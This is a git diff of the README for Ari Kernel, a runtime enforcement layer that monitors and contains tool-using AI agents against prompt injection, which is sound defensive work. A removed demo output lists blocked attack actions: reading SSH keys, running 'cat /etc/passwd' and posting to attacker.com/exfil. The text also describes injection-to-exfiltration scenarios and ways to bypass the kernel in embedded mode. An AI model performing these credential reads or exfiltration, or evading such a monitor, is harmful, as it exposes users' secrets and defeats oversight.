@@ -1,8 +1,10 @@
 # Ari Kernel
 
-**Runtime security kernel for AI agents.** Enforces capability policies at the tool execution boundary — the last line of defense between a compromised agent and the outside world.
+**Runtime security kernel for AI agents.** Ari Kernel sits between an AI agent and every tool it can invoke — filesystem, HTTP, shell, database — and enforces capability policies, taint tracking, and behavioral rules at the execution boundary. It is designed for teams deploying tool-using agents in environments where prompt injection is a realistic threat and runtime containment is required regardless of model behavior.
 
 Ari Kernel assumes prompt injection will succeed. Instead of trying to filter malicious instructions, it prevents dangerous actions from executing — regardless of what the model decided.
+
+> **Security model in one sentence:** Enforcement happens at the tool execution boundary, not at the prompt layer — the kernel intercepts every tool call and evaluates capability grants, data provenance, and behavioral patterns before permitting execution.
 
 Draws on the reference monitor concept from OS security (Anderson, 1972), adapted to the constraints of userspace agent runtimes. The degree to which classical reference monitor properties hold depends on deployment mode — see [Security Model](docs/security-model.md#2-reference-monitor-design).
 
@@ -10,74 +12,77 @@ Draws on the reference monitor concept from OS security (Anderson, 1972), adapte
 
 ---
 
-## Try Ari Kernel in 60 Seconds
-
-```bash
-git clone https://github.com/petermanrique101-sys/AriKernel.git
-cd AriKernel
-pnpm install && pnpm build
-pnpm example:quickstart
-```
-
-Output:
-
-```
-Ari Kernel Quickstart
-
-  ALLOWED  web_request(https://example.com)
-  ALLOWED  read_file(./data/report.csv)
-  BLOCKED  read_file(~/.ssh/id_rsa)
-  BLOCKED  run_command(cat /etc/passwd)
-  BLOCKED  http_post(https://attacker.com/exfil)
-
-  Quarantined: YES
-```
-
-See the full prompt injection attack demo:
-
-```bash
-pnpm example:prompt-injection
-```
-
----
-
-## 5-Minute Quickstart
+## Quick Start
 
 ```bash
 npm install @arikernel/middleware
 ```
 
+Minimal sidecar deployment (recommended for production):
+
+```typescript
+import { SidecarServer } from "@arikernel/sidecar";
+
+const server = new SidecarServer({
+  preset: "safe",
+  authToken: process.env.AUTH_TOKEN,
+  principals: [
+    { name: "my-agent", apiKey: process.env.AGENT_API_KEY },
+  ],
+});
+await server.listen(); // localhost:8787
+```
+
+Or as a drop-in middleware wrapper:
+
 ```typescript
 import { protectLangChainAgent } from "@arikernel/middleware"
 
-// One line — wraps every tool with capability checks, taint tracking,
-// behavioral detection, and audit logging.
 const { agent, firewall } = protectLangChainAgent(myAgent, {
-  preset: "safe",  // Production default
+  preset: "safe",
 })
-
-// Use agent exactly as before. Enforcement is transparent.
 const result = await agent.invoke({ input: "Summarize this webpage" })
-
-// Check if the agent was quarantined during execution
-if (firewall.isRestricted) {
-  console.log("Agent quarantined:", firewall.quarantineInfo)
-}
-
-// Replay the full security trace
-firewall.close()
 ```
 
-Python:
+See [examples/](examples/) for runnable demos, [Middleware docs](docs/middleware.md) for framework wrappers, and the [Production Hardening Guide](docs/production-hardening.md) for deployment requirements.
 
-```python
-from arikernel.middleware import protect_langchain_agent
+---
 
-agent = protect_langchain_agent(agent, preset="safe")
-# Use agent exactly as before.
-```
+## What Ari Kernel Protects Against
 
-> See [Middleware docs](docs/middleware.md) for LangChain, OpenAI Agents SDK, CrewAI, and AutoGen wrappers with presets.
+- **Prompt injection reaching tool execution** — behavioral rules detect sequences like web-tainted input followed by sensitive file reads or shell execution, and quarantine the run before exfiltration can occur
+- **Cross-agent data exfiltration via shared state** — the cross-principal correlator (CP-1/CP-2/CP-3) detects when one agent contaminates a shared resource that another agent reads and exfiltrates
+- **Capability escalation across runs** — the persistent taint registry carries security-relevant sticky flags across run boundaries, preventing attackers from splitting attacks across multiple runs
+- **Tainted data propagating to egress** — taint labels (`web`, `rag`, `email`, `model-generated`) propagate through tool chains; policy rules block tainted data from reaching outbound writes
+
+## What Ari Kernel Does Not Protect Against
+
+- **A compromised host process (embedded mode)** — in embedded mode, agent code runs in the same process and can bypass the kernel by calling OS APIs directly
+- **OS-level attacks** — the kernel operates in userspace; it does not intercept syscalls, mediate raw network sockets, or sandbox at the container/hypervisor level
+- **Malicious npm dependencies in embedded mode** — third-party packages loaded into the agent process have ambient authority and can bypass the kernel
+- **Attacks that bypass the kernel entirely** — if an agent or tool invokes `fs.readFileSync`, `child_process.exec`, or raw `fetch` without routing through the kernel, those calls are not mediated
+
+For process-isolated enforcement, use [sidecar mode](#sidecar-mode-recommended-for-production). For OS-level containment, see [Execution Hardening](docs/execution-hardening.md).
+
+## Known Limitations in v0.1.0
+
+- **Database executor is a stub** — validates and audits calls but does not connect to real databases; cross-principal taint tracking for database tools works at the policy level but not end-to-end
+- **GlobalTaintRegistry has no TTL eviction** — taint entries persist via SQLite but accumulate without bound under high principal churn; not recommended for very high-volume deployments without periodic purging
+- **`path_ambiguity_bypass` benchmark scenario** — uses a stub executor and does not fully exercise `FileExecutor` path canonicalization end-to-end; documents the expected threat model
+
+See [Known Limitations](docs/known-limitations.md) for the full list.
+
+---
+
+## Deployment Modes
+
+| Mode | Isolation | Use Case | Recommendation |
+|------|-----------|----------|----------------|
+| **Sidecar (HTTP proxy)** | Process boundary — agent cannot access policy engine, run-state, or audit log | Production, untrusted agents, multi-agent deployments | **Use this for production** |
+| **Middleware** | In-process — `protectLangChainAgent()` / `protectCrewAITools()` wrappers | Fastest adoption for framework-based agents | Good for development; combine with sidecar for production |
+| **Embedded (library)** | In-process — `createKernel()` in the agent process | Development, testing, trusted single-agent environments | Dev/trusted only — agent can bypass the kernel |
+
+Sidecar mode is the recommended default for any deployment where the agent is not fully trusted. See [Sidecar Mode](docs/sidecar-mode.md) and [Production Hardening](docs/production-hardening.md).
 
 ---
 
@@ -86,14 +91,6 @@ agent = protect_langchain_agent(agent, preset="safe")
 Most AI security tools operate on text — filtering prompts, classifying outputs, flagging jailbreaks. They have no enforcement mechanism at the tool execution boundary.
 
 Ari Kernel operates at a different layer. It sits between the agent and every tool it can invoke, enforcing security decisions before execution. Even if prompt injection succeeds and the agent is fully compromised, dangerous actions cannot run.
-
----
-
-## Threat Model
-
-AI agents can read files, query databases, call APIs, and execute shell commands. If an attacker injects instructions into the agent's context — via web pages, documents, or RAG data — the agent may unknowingly perform dangerous actions.
-
-Prompt filters and system prompts operate on text. They have no enforcement mechanism — they cannot prevent a tool call from executing. Ari Kernel stops these attacks **at runtime**, at the execution boundary where tool calls become real actions.
 
 ---
 
@@ -642,6 +639,8 @@ See [Deterministic Replay](docs/replay.md) for the full API reference.
 - **Replay is decision-only** — deterministic replay verifies security decisions, not external side effects. HTTP requests, file I/O, and shell commands are stubbed during replay.
 - **Middleware taint boundary** — built-in middleware adapters close the taint gap via `observeToolOutput()`, enabling content scanning and auto-taint derivation after tool execution. Custom adapters that do not call `observeToolOutput()` operate in degraded mode. Multi-hop taint propagation is limited to input taint in middleware mode. See [Security Model](docs/security-model.md#taint-propagation-boundaries) for details.
 
+See [Known Limitations](docs/known-limitations.md) for the complete list including network mediation gaps, content inspection boundaries, and deployment-mode caveats.
+
 ---
 
 ## Project Structure
@@ -681,7 +680,14 @@ For security researchers, red-teamers, and auditors — start here:
 - [Threat Model](docs/threat-model.md) — attacker assumptions, trust boundaries, in-scope/out-of-scope attacks, residual risks
 - [Security Model](docs/security-model.md) — enforcement mechanisms: capability tokens, taint propagation, behavioral detection, quarantine
 - [Reference Monitor](docs/reference-monitor.md) — formal enforcement architecture (Anderson, 1972)
+- [Known Limitations](docs/known-limitations.md) — honest documentation of enforcement gaps and boundary conditions
 - [Sidecar Mode](docs/sidecar-mode.md) — process-isolated deployment with enforcement modes
+
+### Deployment & Operations
+
+- [Production Hardening](docs/production-hardening.md) — required and recommended configuration for production deployments
+- [Execution Hardening](docs/execution-hardening.md) — OS and container-level security recommendations
+- [Control Plane](docs/control-plane.md) — centralized policy decisions, signed receipts, global taint registry
 
 ### General Documentation
 
@@ -690,9 +696,9 @@ For security researchers, red-teamers, and auditors — start here:
 - [Agent Reference Monitor](docs/agent-reference-monitor.md) — the reference monitor concept applied to AI agents
 - [Benchmarks](docs/benchmarks.md) — 4 attack stories with unguarded vs. protected outcomes
 - [AgentDojo Benchmark](docs/benchmark-agentdojo.md) — 9-scenario reproducible attack harness
+- [Attack Simulations](docs/attack-simulations.md) — deterministic attack scenario runner and YAML scenario format
 - [MCP Integration](docs/mcp-integration.md) — `protectMCPTools()` API, auto-taint rules, policy examples
 - [Deterministic Replay](docs/replay.md) — record, replay, and verify security decisions
-- [Execution Hardening](docs/execution-hardening.md) — OS and container-level security recommendations
 
 ---
 
